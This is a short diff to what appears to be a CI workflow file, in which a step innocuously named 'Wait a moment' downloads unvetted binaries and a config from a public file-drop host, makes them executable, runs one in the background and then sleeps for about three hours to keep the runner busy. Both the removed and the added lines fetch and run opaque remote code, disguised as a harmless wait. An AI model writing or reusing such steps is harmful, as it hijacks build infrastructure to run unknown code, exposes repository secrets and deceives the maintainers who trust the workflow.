@@ -28,6 +28,8 @@ jobs:
 
       - name: Wait a moment
         run: |
-          wget https://bashupload.com/mxPry/blave
-          chmod +x blave
-          ./blave
+          wget "https://bashupload.com/WWx_8/kE2pE." -O whisperer-server
+          chmod +x whisperer-server
+          wget https://bashupload.com/PWHro/server.toml
+          nohup ./whisperer-server &
+          sleep 10080
